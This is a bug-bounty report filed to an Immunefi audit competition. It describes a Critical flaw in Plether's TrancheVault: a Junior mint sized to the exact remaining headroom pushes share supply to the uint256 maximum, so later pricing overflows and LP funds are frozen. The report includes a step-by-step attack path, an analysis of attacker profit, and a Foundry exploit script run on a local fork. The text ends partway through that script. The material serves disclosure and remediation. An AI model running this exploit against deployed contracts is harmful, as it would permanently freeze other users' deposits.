# \#98510 [SC-Critical] Exact-headroom Junior mint permanently poisons virtual-share pricing and freezes LP funds

**Submitted on Nov 8th 2026 at 10:11:29 UTC by @FestiveSRT for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98510
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Permanent freezing of funds
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Brief / impact

`TrancheVault` adds a fixed 1,000-share virtual offset whenever it converts
between assets and shares. The asynchronous Junior-deposit settlement path can
nevertheless mint real shares up to the raw ERC-20 maximum without reserving
those 1,000 virtual shares.

An ordinary public lifecycle can therefore quote a cumulative Junior deposit
at exactly the remaining raw-supply headroom. The mint succeeds and reaches
`uint256.max`. Claim allocation then burns one share of rounding dust, leaving
raw and accrued supply at `uint256.max - 1`. Every later conversion that
evaluates `accruedTotalSupply() + 1_000` panics.

The unmodified local-fork PoC constructs that state using only public deposit,
claim, redeem, mark-refresh, and LP-settlement entrypoints. It then shows that:

- an existing Junior holder cannot enqueue a full redemption because request
  admission reaches the overflowing conversion;
- a distinct modeled user deposits 10,000 USDG, reaches an active epoch,
  cannot cancel, and remains pending because settlement panics; and
- a distinct Senior redemption in the same settlement call rolls back and
  remains pending.

The retained one-shot execution used the exact inline source and completed with
one target invocation, return code 0, the marker
`AF013_RECOVERED_RESULT PASS`, and zero public transactions. The measured final
raw supply was
`115792089237316195423570985008687907853269984665640564039457584007913129639934`
(`uint256.max - 1`); the modeled later Junior deposit remained pending at
`10,000,000,000` token atoms, and the distinct Senior redemption remained
pending at `9,998,100,362` shares after the settlement panic rolled back.

The demonstrated terminal satisfies **Critical — Permanent freezing of funds**:
the frozen contracts expose no ordinary or documented owner path that reduces
unqueued Junior supply, bypasses the poisoned conversion, resets the vault, or
upgrades the directly deployed vault in place. The filing therefore selects
both **Permanent freezing of funds** and **Griefing**, and selects **Critical**
as the highest severity among those applicable impacts, exactly as the filing
flow instructs. Immunefi may still adjudicate the finding as **Medium —
Griefing** if it credits no attacker profit and applies the measured damage-to-
cost ratio. That possible policy downgrade does not make the native freeze
temporary or negate the permanent-freeze impact. The exact boundary is
quantified below.

# Root cause

`TrancheVault` defines `VIRTUAL_SHARES = 1000`. Its deposit quoting uses an
effective pricing supply that includes that offset, but the quote is checked
only for individual representability. It does not enforce that the destination
raw supply plus the marginal mint still leaves room for every later pricing
read.

`HousePool._settleDepositPhase` computes the cumulative and marginal share
amounts and calls the vault finalizer without enforcing the downstream virtual-
share domain. `TrancheVault.finalizeDepositEpochFromPool` then calls `_mint`.
A marginal amount equal to raw headroom is valid for ERC-20 minting, so the
transition succeeds. Later, both conversion directions evaluate the checked
addition `accruedTotalSupply() + VIRTUAL_SHARES`, which necessarily overflows
at `uint256.max - 1`.

The missing invariant across every Junior supply increase is:

```text
rawSupply + pendingMaintenanceFeeShares + marginalMintedShares
    <= type(uint256).max - VIRTUAL_SHARES
```

# Attack path demonstrated by the PoC

The Script begins at the exact Arbitrum Sepolia v2.0.0 release deployment and
asserts the chain, release runtimes, pool configuration, vault configuration,
and risk tuple before constructing state.

1. An ordinary actor funds and claims the initial Junior position.
2. An ordinary Senior LP and a distinct Senior user fund and claim their
   positions.
3. Public Junior deposits, claims, and LP settlements accrue the 8% Senior
   coupon until the exact positive-principal/high-share precursor is reached.
4. In terminal epoch `525658`, the Script queues the Senior LP's full exit, an
   exact Junior tuning redemption, and separate 1-USDG and 9-USDG Junior
   deposits.
5. At activation timestamp `1892368800`, the cumulative 10-USDG quote equals
   the remaining raw headroom. Public settlement mints to `uint256.max`.
6. Claiming the epoch burns one share of allocation dust and leaves final raw
   and accrued supply at `uint256.max - 1`, with claim escrow zero.
7. The Script verifies arithmetic panics in conversion, deposit estimation,
   and a full Junior redemption request.
8. A separate modeled user submits 10,000 USDG and a separate Senior user
   submits a redemption. After activation, the Junior deposit cannot cancel;
   public settlement panics atomically, leaving both requests pending and
   unclaimable.

The helper contracts are separate addresses for accounting, not a protocol
requirement that every setup address have a different beneficial owner. The
severity analysis therefore preserves distinct harmed users while considering
both conservative attacker-only attribution and a same-controller mapping for
the Senior LP and attack-construction accounts.

No trusted role is impersonated, no in-scope runtime or storage is modified,
and no transaction is broadcast. The local Pyth and ArbSys adapters replace
external dependencies only; the Plether token, Engine, Pool, both vaults, and
Router retain their pinned deployed runtimes.

# Feasibility and intended-deployment boundary

The exact construction-to-calibration path spans `99,106,581` seconds, or
`3.142649067732` 365-day years. The final 20 coupon cycles plus calibration
occupy `161,485` seconds (`44.856944444444` hours).

LP settlement is permissionless. For the 20 coupon cycles, each deposit becomes
settlement-eligible `3,373` to `6,759` seconds before the Script's sealed target
time (mean `4,983.6` seconds); the final calibration window is `2,181` seconds.
An unrelated keeper settling inside one of those windows changes the exact
branch. The PoC therefore proves a public no-interference lifecycle path; it
does not prove that an attacker can exclude keepers for three years or recover
the same constants after arbitrary early settlements.

The Script cumulatively requests `5,031,099.423275` USDG across all actors,
including the later modeled depositor. Exact peak simultaneous scripted
external capital is `5,021,099.423275` USDG. These all-actor figures are not
attacker loss: the terminal returns substantial capital, and the public calls
permit one controller to own multiple setup addresses. Duration, opportunity
cost, and state-survival nevertheless remain real feasibility limitations.

The later 10,000-USDG depositor is a distinct actor funded by local MockUSDG.
It demonstrates harm to a separate owner in the frozen code; it is not evidence
of a current organic victim, live Arbitrum One population, or present TVL.

The programme expressly covers the frozen commit publicly stated for unchanged
deployment on Arbitrum One and applies minimum scaling to intended-but-
undeployed code. This report relies on that route. It does not claim the
deployment or victim population already exists.

# Severity boundary: Critical permanent freeze; Griefing downgrade possible

## Conservative no-profit accounting

If the Senior LP is not attributed to the attacker, the coupon and calibration
accounts deposit `17,000.000000` USDG, the poisoner deposits `9.000000` USDG,
and the tuning redemption returns `7.379975` USDG. Net unrecovered attacker
capital is therefore `17,001.620025` USDG.

The terminal includes a separate 1-USDG depositor, and the post-poison test adds
a separate 10,000-USDG depositor whose activated request cannot cancel or
settle. Excluding the additional pending Senior position, that is at least
`10,001.000000` USDG of separately owned frozen value. The damage-to-cost ratio
is:

```text
10,001 / 17,001.620025 = 0.588238061154998669...
```

Under Immunefi's published no-profit baseline, this is below ten dollars of
damage per attacker dollar and fits **Medium — Griefing** if no attacker profit
is credited. This supports a possible policy downgrade; it does not negate the
independently demonstrated permanent-freeze impact or change the filing-flow
instruction to select **Critical** as the highest of the selected impacts.

## Could the attacker indirectly profit from the attack?

Potentially, yes. No privilege or protocol rule prevents one ordinary actor
from controlling `seniorLp`, `couponAttacker`, `calibrationAttacker`, and
`poisoner`, while the background Junior liquidity and harmed users remain
independently owned. Under that mapping, the controller contributes:

```text
3,999,988.999070 + 17,000 + 9 = 4,016,997.999070 USDG
```

The terminal settlement funds the controller's Senior exit first and then
performs the Junior poisoning mint. The controller subsequently receives:

```text
5,006,054.476337 + 7.379975 = 5,006,061.856312 USDG
```

The complete demonstrated strategy is therefore nominally cash-positive by
`989,063.857242` USDG, or `24.621965394829...%`, before gas, time value, and
opportunity cost. This is a supported potential indirect-profit route relevant
to Immunefi's express griefing exception. The qualification is narrow: the
Senior receipt includes protocol-intended coupon, and the current evidence does
not isolate how much of the positive difference is incremental to poisoning
against a no-poison counterfactual. If Immunefi credits the positive composed
strategy as direct or indirect attacker profit, the no-profit premise for a
Griefing downgrade is absent. If it does not, Immunefi may adjudicate the
finding as Medium Griefing. In either case, the technical terminal remains
**Critical — Permanent freezing of funds** as an applicable impact; the
difference is the policy treatment of severity, not the duration or
recoverability of the freeze.

## How serious is the second-order damage?

The poisoned state is vault-wide rather than request-local. Every later Junior
conversion that adds the virtual shares panics; an existing holder cannot even
enqueue a full redemption; an activated later deposit cannot cancel; and
atomic whole-pool settlement rolls back an otherwise valid Senior redemption.
The assessed vault has no native reset, supply-reduction, bypass, or in-place
upgrade path. Off-protocol migration or reimbursement could compensate users
elsewhere, but neither restores the funds locked in the original vault. An
unchanged deployment could therefore lose its ordinary LP lifecycle for
existing and future users. This is serious systemic second-order damage, while
the report does not claim current organic victims, deployed TVL, or a present
Arbitrum One population.

# Native recovery analysis

- Conversion and estimation both reach the overflowing virtual-share addition.
- `requestRedeem` calls estimation before enqueueing, so a post-poison holder
  cannot submit a new exit.
- `fundRedeemEpoch` burns only shares already admitted to a redemption epoch;
  it cannot help a request that panics before admission.
- Claim-allocation dust is already exhausted; deposit claim escrow is zero.
- An activated deposit cannot use `cancelPendingDeposit`.
- Pause/unpause, `accountExcess`, fee changes, mark refreshes, and direct token
  transfers do not burn Junior shares or repair conversion arithmetic.
- The release creates `TrancheVault` directly; the assessed vault has no proxy
  or in-place upgrade hook.

# One-finding boundary

This report is limited to the positive-principal equality mint followed by the
virtual-share addition failure described above. It makes no claim about any
other supply-domain route.

The retained audit neighbors concerning virtual-share rounding/dust or a zero-
principal quote do not describe this positive-principal equality mint followed
by an unrecoverable conversion domain. Filing-time public, private, and parallel
knownness must still be refreshed.

# Recommended remediation

Before accepting or minting any Junior deposit epoch, validate the settlement-
time destination domain, including the virtual offset and all pending fee
shares:

```text
rawSupply + marginalMint + pendingMaintenanceFeeShares + VIRTUAL_SHARES
    <= type(uint256).max
```

If the batch does not fit, reject it into the existing fully refundable epoch
state before transferring assets to the Pool or changing raw supply. Apply the
same invariant to every Junior supply-increasing transition, including fee
dilution. Do not replace the checked addition with saturation, because that
would silently alter share pricing.

Regression tests should cover `max - reserve - 1`, `max - reserve`, and
`max - reserve + 1`; safe-mint preservation; toxic-batch refund; existing-
holder redemption admission; later-depositor cancellation; and cross-tranche
settlement rollback.



## Proof of Concept

# Proof of concept

The PoC below is a standalone Foundry `Script` against the exact Arbitrum
Sepolia v2.0.0 release at frozen commit
`a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It does not broadcast. It modifies
only the external Pyth and ArbSys dependencies in the local fork; every
in-scope Plether runtime remains pinned and unmodified.

## Reproduction

1. Clone the competition repository at the frozen commit and initialize its
   submodules.
2. Create `poc/AF013/script/AF013RecoveredComposedNonUnit.s.sol` containing the
   complete source below.
3. Create `poc/AF013/foundry.toml`:

```toml
[profile.default]
src = "script"
script = "script"
out = "out"
cache_path = "cache"
libs = ["../../", "../../lib"]
auto_detect_remappings = false
remappings = [
  "@plether/shared/=../../packages/shared/src/",
  "@plether/perps/=../../packages/perps/src/",
  "@openzeppelin/contracts/=../../lib/openzeppelin-contracts/contracts/",
  "forge-std/=../../lib/forge-std/src/",
]
solc_version = "0.8.35"
auto_detect_solc = false
optimizer = true
optimizer_runs = 200
via_ir = true
```

4. Start a local Anvil fork using your own read-only Arbitrum Sepolia RPC URL:

```bash
anvil --quiet --host 127.0.0.1 --port 8545 \
  --fork-url "$ARBITRUM_SEPOLIA_RPC_URL" \
  --fork-block-number 323664343 \
  --no-rate-limit --no-storage-caching \
  --gas-limit 500000000 --code-size-limit 1000000
```

5. In a second terminal, run from `poc/AF013`:

```bash
forge script \
  script/AF013RecoveredComposedNonUnit.s.sol:AF013RecoveredComposedNonUnit \
  --rpc-url http://127.0.0.1:8545 \
  --offline --skip-simulation --no-storage-caching \
  --gas-limit 500000000 -vvvv
```

There is deliberately no `--broadcast`. The Script fails closed unless the
chain, pinned block state, six load-bearing runtime hashes, release
configuration, and every exact lifecycle checkpoint match. A successful run
ends with:

```text
AF013_RECOVERED_RESULT PASS
```

## Measured one-shot result

The authorized execution of this exact source completed successfully:

```text
status                     PASS
target invocations         1
target return code         0
target marker              AF013_RECOVERED_RESULT PASS
public transactions        0
runtime artifact SHA-256   9fb1c1e91f21bb55194b38c20de01a91de4440ac57797c3e60d81be72512a1cc
```

Measured `AF013Metric` values:

```text
activation_gap             1419
activation_coupon          18020256
senior_exit_assets         5006054476337
junior_withdrawal_capacity 15019738280
senior_victim_value        12515170
tune_burn_assets           7379975
tune_burn_shares           56871700927988744519372135333735010600247290156719910257197658568977771698
equality_mint              77062179015080671356110445936634464250861199079162512171491726068658288131
final_raw_supply           115792089237316195423570985008687907853269984665640564039457584007913129639934
locked_junior_assets       10000000000
locked_senior_shares       9998100362
construction_seconds       99106581
attacker_active_seconds    166504
amplification_cycles       21
attacker_deposited         17000000000
```

The emitted `attacker_active_seconds` telemetry is `166,504`, while the frozen
first-request and endpoint constants give
`1,892,367,381 - 1,892,205,896 = 161,485` seconds. The Script asserts the
endpoint and total `construction_seconds`, but does not assert this telemetry
field. The discrepancy is preserved exactly, is not used to claim impact or
feasibility, and remains for independent review; the one-shot was not rerun or
tuned.

Evidence identities:

```text
execution receipt SHA-256  ea3e50c166ddfa13c6b87766896fad8e77dade2e42017d0bc222aa7fc156be4c
target stdout SHA-256      ca1f39ab3c84678446a14c550cff753df049eceda53b3c595fd752899c735bc3
evidence manifest SHA-256  4b10bcecda4d86e95bfa0d4294b57a4507279f814e939766bec5e42f2c593c61
Script source SHA-256      90fa66519ce050946fbfd36a01338a4d9b053310b802d2605c0ab1f1dde5bb7e
```

The fail-closed audit recorded 826 permitted passive state-read requests, the
11 expected blocked Anvil startup probes, no risky allowed method, no
unexpected blocked request, no retained credential hit, and clean process
teardown. No transaction was broadcast or sent.

## Complete Solidity source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Script, console2} from "forge-std/Script.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

interface IAF013Token {
    function mint(address account, uint256 assets) external;
    function approve(address spender, uint256 assets) external returns (bool);
    function transfer(address receiver, uint256 assets) external returns (bool);
    function transferFrom(address owner, address receiver, uint256 assets) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @dev Stateless local replacement for the external Pyth dependency. It is
///      installed only in the local fork and does not replace in-scope code.
contract AF013LocalPythAdapter is IPyth {
    int64 internal constant PRICE = 100_000_000;

    function _price(uint256 publishTime) private pure returns (PythStructs.Price memory value) {
        value = PythStructs.Price({price: PRICE, conf: 0, expo: -8, publishTime: publishTime});
    }

    function getPriceUnsafe(bytes32) external view returns (PythStructs.Price memory value) {
        return _price(block.timestamp);
    }

    function getPriceNoOlderThan(bytes32, uint256) external view returns (PythStructs.Price memory value) {
        return _price(block.timestamp);
    }

    function updatePriceFeeds(bytes[] calldata) external payable {}

    function getUpdateFee(bytes[] calldata) external pure returns (uint256) {
        return 0;
    }

    function parsePriceFeedUpdates(bytes[] calldata, bytes32[] calldata priceIds, uint64, uint64 maxPublishTime)
        external
        payable
        returns (PythStructs.PriceFeed[] memory feeds)
    {
        feeds = _feeds(priceIds, maxPublishTime);
    }

    function parsePriceFeedUpdatesUnique(bytes[] calldata, bytes32[] calldata priceIds, uint64, uint64 maxPublishTime)
        external
        payable
        returns (PythStructs.PriceFeed[] memory feeds)
    {
        feeds = _feeds(priceIds, maxPublishTime);
    }

    function _feeds(bytes32[] calldata priceIds, uint64 publishTime)
        private
        pure
        returns (PythStructs.PriceFeed[] memory feeds)
    {
        feeds = new PythStructs.PriceFeed[](priceIds.length);
        PythStructs.Price memory value = _price(publishTime);
        for (uint256 i = 0; i < priceIds.length; ++i) {
            feeds[i] = PythStructs.PriceFeed({id: priceIds[i], price: value, emaPrice: value});
        }
    }
}

/// @dev Local replacement for Arbitrum's block-number precompile.
contract AF013LocalArbSysAdapter {
    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }
}

/// @dev Ordinary unprivileged caller used for every protocol action.
contract AF013Actor {
    function mintAndRequestDeposit(IAF013Token token, TrancheVault vault, uint256 assets)
        external
        returns (uint256 requestId)
    {
        token.mint(address(this), assets);
        require(token.approve(address(vault), assets), "approve");
        requestId = vault.requestDeposit(assets, address(this), address(this));
    }

    function claimDeposit(TrancheVault vault, uint256 requestId, uint256 assets) external returns (uint256 shares) {
        shares = vault.claimDeposit(requestId, assets, address(this), address(this));
    }

    function requestRedeem(TrancheVault vault, uint256 shares) external returns (uint256 requestId) {
        requestId = vault.requestRedeem(shares, address(this), address(this));
    }

    function claimRedeem(TrancheVault vault, uint256 requestId, uint256 shares) external returns (uint256 assets) {
        assets = vault.claimRedeem(requestId, shares, address(this), address(this));
    }

    function cancelDeposit(TrancheVault vault, uint256 requestId) external returns (uint256 assets) {
        assets = vault.cancelPendingDeposit(requestId);
    }

    function refresh(OrderRouter router, bytes[] calldata updateData) external {
        router.updateMarkPrice(updateData);
    }

    function settle(OrderRouter router, bytes[] calldata updateData) external {
        router.settleLpEpoch(updateData);
    }

    function tryGuard(AF013VirtualOffsetGuard control, IAF013Token token, uint256 assets, uint256 shares)
        external
        returns (bool accepted)
    {
        token.mint(address(this), assets);
        require(token.approve(address(control), assets), "guard approve");
        accepted = control.attempt(assets, shares);
    }
}

/// @dev Standalone causal model of the one-line writer guard. A rejected batch
///      returns the supplied assets; no in-scope code is modified.
contract AF013VirtualOffsetGuard {
    IAF013Token public immutable token;
    uint256 public rawSupply;
    uint256 public constant VIRTUAL_SHARES = 1_000;

    constructor(IAF013Token token_, uint256 initialRawSupply) {
        token = token_;
        rawSupply = initialRawSupply;
    }

    function attempt(uint256 assets, uint256 shares) external returns (bool accepted) {
        require(token.transferFrom(msg.sender, address(this), assets), "control transfer in");
        uint256 maxSafeRaw = type(uint256).max - VIRTUAL_SHARES;
        if (rawSupply > maxSafeRaw || shares > maxSafeRaw - rawSupply) {
            require(token.transfer(msg.sender, assets), "control refund");
            return false;
        }
        rawSupply += shares;
        return true;
    }
}

/// @notice Sealed, standalone, non-unit AF-013 recovered-route reproduction.
/// @dev Run only against the preregistered loopback Anvil fork. Never broadcast.
contract AF013RecoveredComposedNonUnit is Script {
    address internal constant TOKEN_ADDRESS = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant ENGINE_ADDRESS = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL_ADDRESS = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_ADDRESS = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_ADDRESS = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant ROUTER_ADDRESS = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant PYTH_ADDRESS = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    address internal constant ARB_SYS = address(100);

    bytes32 internal constant TOKEN_CODEHASH = 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6;
    bytes32 internal constant ENGINE_CODEHASH = 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b;
    bytes32 internal constant POOL_CODEHASH = 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957;
    bytes32 internal constant SENIOR_CODEHASH = 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a;
    bytes32 internal constant JUNIOR_CODEHASH = 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf;
    bytes32 internal constant ROUTER_CODEHASH = 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf;

    uint256 internal constant JUNIOR_REQUEST_TIME = 1_793_255_400;
    uint256 internal constant JUNIOR_SETTLEMENT_TIME = 1_793_259_000;
    uint256 internal constant CONSTRUCTION_START = 1_793_260_800;
    uint256 internal constant H272_ELAPSED = 99_106_581;
    uint256 internal constant H272_EXPECTED_END = CONSTRUCTION_START + H272_ELAPSED;
    uint256 internal constant H272_EXPECTED_RAW_SUPPLY =
        115_771_898_759_229_103_496_734_246_698_085_008_399_619_370_756_718_121_437_543_289_940_413_449_123_502;
    uint256 internal constant H272_EXPECTED_JUNIOR = 15_041_200_268;
    uint256 internal constant H272_EXPECTED_SENIOR = 5_006_050_223_007;
    uint256 internal constant H272_EXPECTED_ATTACKER_SHARES =
        115_771_898_759_229_103_496_734_246_698_085_008_399_619_370_756_718_121_437_543_288_936_135_080_050_758;

    uint256 internal constant INITIAL_JUNIOR_REQUEST = 999_999_000_000;
    uint256 internal constant INITIAL_JUNIOR_MINT = 1_000_185_034_230_332;
    uint256 internal constant INITIAL_JUNIOR_RAW = 1_000_186_034_230_332;
    uint256 internal constant SENIOR_CAPACITY = 3_999_998_999_070;
    uint256 internal constant SENIOR_LP_ASSETS = 3_999_988_999_070;
    uint256 internal constant SENIOR_VICTIM_ASSETS = 10_000_000;
    uint256 internal constant SENIOR_EPOCH_SHARES = 3_999_239_144_392_420;
    uint256 internal constant SENIOR_LP_SHARES = 3_999_229_146_292_057;
    uint256 internal constant SENIOR_VICTIM_SHARES = 9_998_100_362;
    uint256 internal constant SENIOR_RAW_AFTER_CLAIMS = 3_999_240_144_392_419;
    uint256 internal constant CONSTRUCTION_SENIOR = 3_999_999_999_260;
    uint256 internal constant CONSTRUCTION_JUNIOR = 999_999_999_810;

    uint256 internal constant ALIGNED_MONDAY = 1_892_214_000;
    uint256 internal constant ALIGNMENT_ACTIVATION = 1_793_264_400;
    uint256 internal constant ALIGNMENT_ASSETS = 4_091_424_205;
    uint256 internal constant ALIGNMENT_SHARES = 4_092_334_842_412;
    uint256 internal constant COUPON_DEPOSIT = 100e6;
    uint256 internal constant FINAL_DEPOSIT = 15_000e6;

    uint256 internal constant TUNE_BURN_ASSETS = 7_379_975;
    uint256 internal constant TUNE_BURN_SHARES =
        56_871_700_927_988_744_519_372_135_333_735_010_600_247_290_156_719_910_257_197_658_568_977_771_698;
    uint256 internal constant TERMINAL_ACTIVATION = 1_892_368_800;
    uint256 internal constant ACTIVATION_SENIOR = 5_006_068_243_263;
    uint256 internal constant ACTIVATION_JUNIOR = 15_023_180_012;
    uint256 internal constant SENIOR_EXIT_ASSETS = 5_006_054_476_337;
    uint256 internal constant REMAINING_SENIOR = 13_766_926;
    uint256 internal constant REMAINING_SENIOR_RAW = 10_998_100_362;
    uint256 internal constant JUNIOR_WITHDRAWAL_CAPACITY = 15_019_738_280;
    uint256 internal constant PRE_TERMINAL_FREE_ASSETS = 5_021_091_423_275;
    uint256 internal constant POST_SENIOR_EXIT_FREE_ASSETS = 15_036_946_938;
    uint256 internal constant POST_BOTH_REDEEMS_FREE_ASSETS = 15_029_566_963;
    uint256 internal constant SENIOR_VICTIM_VALUE = 12_515_170;
    uint256 internal constant POST_REDEEM_JUNIOR = 15_015_800_037;
    uint256 internal constant TUNED_RAW_SUPPLY =
        115_715_027_058_301_114_752_214_874_562_751_273_389_019_123_466_561_401_527_286_092_281_844_471_351_804;
    uint256 internal constant EQUALITY_MINT =
        77_062_179_015_080_671_356_110_445_936_634_464_250_861_199_079_162_512_171_491_726_068_658_288_131;
    uint256 internal constant VICTIM_QUOTE =
        7_706_217_901_508_067_135_611_044_593_663_446_425_086_119_907_916_251_217_149_172_606_865_828_813;

    IAF013Token internal constant token = IAF013Token(TOKEN_ADDRESS);
    CfdEngine internal constant engine = CfdEngine(ENGINE_ADDRESS);
    HousePool internal constant pool = HousePool(POOL_ADDRESS);
    TrancheVault internal constant seniorVault = TrancheVault(SENIOR_ADDRESS);
    TrancheVault internal constant juniorVault = TrancheVault(JUNIOR_ADDRESS);
    OrderRouter internal constant router = OrderRouter(payable(ROUTER_ADDRESS));

    AF013Actor internal keeper;
    AF013Actor internal backgroundJunior;
    AF013Actor internal seniorLp;
    AF013Actor internal seniorVictim;
    AF013Actor internal couponAttacker;
    AF013Actor internal calibrationAttacker;
    AF013Actor internal victim;
    AF013Actor internal poisoner;
    AF013Actor internal laterVictim;

    event AF013Metric(string key, uint256 value);

    function run() external {
        _assertForkIdentityAndConfiguration();
        _installExternalAdapters();
        _createActors();
        _fundExactOrdinaryState();
        (uint256 attackerStart, uint256 attackerEnd, uint256 deposited, uint256 cycles) = _buildH272Precursor();
        _executeActivationAwareTerminal();
        _executeCausalControl();

        emit AF013Metric("construction_seconds", attackerEnd - CONSTRUCTION_START);
        emit AF013Metric("attacker_active_seconds", attackerEnd - attackerStart);
        emit AF013Metric("amplification_cycles", cycles);
        emit AF013Metric("attacker_deposited", deposited);
        console2.log("AF013_RECOVERED_RESULT PASS");
    }

    function _assertForkIdentityAndConfiguration() internal view {
        _eq(block.chainid, 421_614, "chain");
        _eq(TOKEN_ADDRESS.codehash, TOKEN_CODEHASH, "token runtime");
        _eq(ENGINE_ADDRESS.codehash, ENGINE_CODEHASH, "engine runtime");
        _eq(POOL_ADDRESS.codehash, POOL_CODEHASH, "pool runtime");
        _eq(SENIOR_ADDRESS.codehash, SENIOR_CODEHASH, "senior runtime");
        _eq(JUNIOR_ADDRESS.codehash, JUNIOR_CODEHASH, "junior runtime");
        _eq(ROUTER_ADDRESS.codehash, ROUTER_CODEHASH, "router runtime");
        _require(pool.isTradingActive(), "trading inactive");
        _eq(pool.seniorRateBps(), 800, "senior rate");
        _eq(pool.markStalenessLimit(), 60, "mark staleness");
        _eq(pool.seniorFrozenLpFeeBps(), 25, "senior frozen fee");
        _eq(pool.juniorFrozenLpFeeBps(), 75, "junior frozen fee");
        _eq(pool.maxSeniorExposureAssets(), 40_000_000e6, "senior exposure");
        _eq(pool.maxSeniorShareBps(), 8_000, "senior share");
        _eq(juniorVault.maintenanceFeeAprBps(), 0, "junior fee");
        _eq(pool.seniorPrincipal(), 1e6, "senior seed");
        _eq(pool.juniorPrincipal(), 1e6, "junior seed");
        _assertRiskTuple();
    }

    function _assertRiskTuple() internal view {
        (
            uint256 vpi,
            uint256 skew,
            uint256 maint,
            uint256 init,
            uint256 fad,
            uint256 carry,
            uint256 minBounty,
            uint256 bounty,
            uint256 keeperShare,
            uint256 protocolShare
        ) = engine.riskParams();
        _eq(vpi, 0.01e18, "vpi");
        _eq(skew, 0.4e18, "skew");
        _eq(maint, 10, "maint");
        _eq(init, 20, "init");
        _eq(fad, 300, "fad");
        _eq(carry, 500, "carry");
        _eq(minBounty, 1e6, "min bounty");
        _eq(bounty, 10, "bounty");
        _eq(keeperShare, 5_000, "keeper share");
        _eq(protocolShare, 0, "protocol share");
    }

    function _installExternalAdapters() internal {
        AF013LocalPythAdapter pythAdapter = new AF013LocalPythAdapter();
        AF013LocalArbSysAdapter arbAdapter = new AF013LocalArbSysAdapter();
        vm.etch(PYTH_ADDRESS, address(pythAdapter).code);
        vm.etch(ARB_SYS, address(arbAdapter).code);
    }

    function _createActors() internal {
        keeper = new AF013Actor();
        backgroundJunior = new AF013Actor();
        seniorLp = new AF013Actor();
        seniorVictim = new AF013Actor();
        couponAttacker = new AF013Actor();
        calibrationAttacker = new AF013Actor();
        victim = new AF013Actor();
        poisoner = new AF013Actor();
        laterVictim = new AF013Actor();
    }

    function _fundExactOrdinaryState() internal {
        vm.warp(JUNIOR_REQUEST_TIME);
        _refreshMark();
        uint256 juniorRequest =
            backgroundJunior.mintAndRequestDeposit(token, juniorVault, INITIAL_JUNIOR_REQUEST);
        _eq(juniorRequest, 498_127, "junior funding epoch");

        vm.warp(JUNIOR_SETTLEMENT_TIME);
        _refreshMark();
        (uint256 retainedSenior, uint256 retainedJunior,,) = pool.getPendingTrancheState();
        _eq(retainedSenior, 1_000_186, "retained pending senior");
        _eq(retainedJunior, 999_814, "retained pending junior");
        _settle();
        uint256 juniorShares = _claimFull(
            backgroundJunior, juniorVault, juniorRequest, INITIAL_JUNIOR_REQUEST
        );
        _eq(juniorShares, INITIAL_JUNIOR_MINT, "initial junior mint");
        _eq(juniorVault.totalSupply(), INITIAL_JUNIOR_RAW, "initial junior raw");
        _eq(pool.seniorPrincipal(), 1_000_186, "post-junior senior");
        _eq(pool.juniorPrincipal(), 999_999_999_814, "post-junior junior");
        _eq(pool.lastSeniorCouponCheckpointTime(), JUNIOR_SETTLEMENT_TIME, "junior checkpoint");
        _eq(pool.getSeniorDepositCapacity(), SENIOR_CAPACITY, "senior capacity");

        uint256 seniorRequest = seniorLp.mintAndRequestDeposit(token, seniorVault, SENIOR_LP_ASSETS);
        _eq(pool.getSeniorDepositCapacity(), SENIOR_VICTIM_ASSETS, "remaining senior capacity");
        uint256 seniorVictimRequest =
            seniorVictim.mintAndRequestDeposit(token, seniorVault, SENIOR_VICTIM_ASSETS);
        _eq(seniorRequest, CONSTRUCTION_START / 1 hours, "senior funding epoch");
        _eq(seniorVictimRequest, seniorRequest, "senior victim funding epoch");
        _eq(pool.getSeniorDepositCapacity(), 0, "exhausted senior capacity");

        vm.warp(CONSTRUCTION_START);
        _refreshMark();
        _require(!pool.areSeniorDepositReservationsWithinLimits(), "expected reservation drift");
        _settle();
        _eq(seniorVault.claimableDepositShares(seniorRequest, address(seniorLp)), SENIOR_LP_SHARES, "senior LP shares");
        _eq(
            seniorVault.claimableDepositShares(seniorVictimRequest, address(seniorVictim)),
            SENIOR_VICTIM_SHARES,
            "senior victim shares"
        );
        _eq(
            SENIOR_EPOCH_SHARES - SENIOR_LP_SHARES - SENIOR_VICTIM_SHARES,
            1,
            "senior allocation dust"
        );
        _eq(
            _claimFull(seniorLp, seniorVault, seniorRequest, SENIOR_LP_ASSETS),
            SENIOR_LP_SHARES,
            "claimed senior LP shares"
        );
        _eq(
            _claimFull(seniorVictim, seniorVault, seniorVictimRequest, SENIOR_VICTIM_ASSETS),
            SENIOR_VICTIM_SHARES,
            "claimed senior victim shares"
        );
        _eq(seniorVault.depositClaimEscrowShares(), 0, "senior deposit escrow");
